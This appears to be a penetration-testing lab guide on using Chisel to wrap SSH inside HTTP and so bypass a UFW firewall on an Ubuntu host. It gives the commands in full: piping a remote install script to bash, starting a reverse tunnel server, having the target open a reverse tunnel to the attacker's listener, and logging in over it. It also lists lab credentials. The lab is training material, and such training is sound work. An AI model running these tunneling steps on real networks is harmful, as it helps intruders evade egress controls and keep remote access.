### Scenario

**HTTP/S Encapsulated Reverse Tunneling with Chisel** provides penetration testers with a fast, lightweight mechanism to bypass egress network firewalls that restrict inbound and outbound non-HTTP traffic (e.g., SSH on TCP/22). By encapsulating arbitrary TCP/UDP traffic within HTTP/HTTPS requests on allowed ports (`80`, `443`), Chisel establishes encrypted reverse tunnels back to attacker-controlled listeners.

Key technical concepts in Chisel HTTP tunneling:
1. **Firewall Egress Restriction Setup**: Enforcing strict UFW host firewall rules on target Linux client (<font color="#38bdf8"><b>192.168.0.19</b></font>) permitting only HTTP (`80/tcp`) and HTTPS (`443/tcp`), effectively blocking direct inbound SSH connections (<font color="#ffd700"><b>ssh bob@192.168.0.19</b></font> fails).
2. **User Account Creation for Tunneling**: Creating dedicated target user <font color="#c084fc"><b>bob</b></font> (<font color="#ff4d4d"><b>Bob@123</b></font>) on Ubuntu client host.
3. **Chisel Server Initialization**: Executing <font color="#ffd700"><b>sudo chisel server -p 80 --reverse</b></font> on Parrot Security (<font color="#38bdf8"><b>192.168.0.18</b></font>) to start an HTTP listener on port `80` with reverse tunnel support.
4. **Chisel Client Reverse Port Forwarding**: Executing <font color="#ffd700"><b>chisel client 192.168.0.18:80 R:2222:127.0.0.1:22</b></font> on Ubuntu client host to map remote server port `2222` back to local SSH service (`127.0.0.1:22`).
5. **Reverse SSH Access & PCAP Verification**: Connecting via SSH to local forwarded port on Parrot Security (<font color="#ffd700"><b>ssh -p 2222 bob@127.0.0.1</b></font>), establishing a shell, and capturing/filtering HTTP tunneled traffic (`tcp.port == 80`) in Wireshark.

In this exercise, we log into **Parrot Security** (<font color="#c084fc"><b>pentester</b></font> / <font color="#ff4d4d"><b>toor</b></font>) and **Ubuntu** (<font color="#c084fc"><b>Ubuntu</b></font> / <font color="#ff4d4d"><b>toor</b></font>), enable UFW firewall on Ubuntu allowing only ports `80` and `443`, create user <font color="#c084fc"><b>bob</b></font>, verify direct SSH failure, install **Chisel** via cURL script (`curl https://i.jpillora.com/chisel! | bash`), start Chisel reverse server on port `80`, initiate client reverse tunnel (`R:2222:127.0.0.1:22`), log in over reverse SSH tunnel (<font color="#ffd700"><b>ssh -p 2222 bob@127.0.0.1</b></font>), and inspect HTTP encapsulated packets in Wireshark (`tcp.port == 80`).

### Objective

The objective of this lab is to help students learn how to:
- Authenticate to Parrot Security VM (<font color="#c084fc"><b>pentester</b></font> / <font color="#ff4d4d"><b>toor</b></font>) and Ubuntu VM (<font color="#c084fc"><b>Ubuntu</b></font> / <font color="#ff4d4d"><b>toor</b></font>)
- Configure UFW firewall on Ubuntu: <font color="#ffd700"><b>ufw enable</b></font>, <font color="#ffd700"><b>ufw allow 80/tcp</b></font>, <font color="#ffd700"><b>ufw allow 443/tcp</b></font>
- Add target user account on Ubuntu: <font color="#ffd700"><b>sudo adduser bob</b></font> (Password: <font color="#ff4d4d"><b>Bob@123</b></font>)
- Verify direct SSH blockage from Parrot Security: <font color="#ffd700"><b>ssh bob@192.168.0.19</b></font>
- Install Chisel binary on both hosts: <font color="#ffd700"><b>curl https://i.jpillora.com/chisel! | bash</b></font>
- Start Chisel reverse server on Parrot Security: <font color="#ffd700"><b>sudo chisel server -p 80 --reverse</b></font>
- Establish Chisel client reverse tunnel on Ubuntu: <font color="#ffd700"><b>chisel client 192.168.0.18:80 R:2222:127.0.0.1:22</b></font>
- Connect to reverse SSH shell via local forwarded port: <font color="#ffd700"><b>ssh -p 2222 bob@127.0.0.1</b></font>
- Capture and inspect HTTP tunneled frames in Wireshark: <font color="#ffd700"><b>tcp.port == 80</b></font>
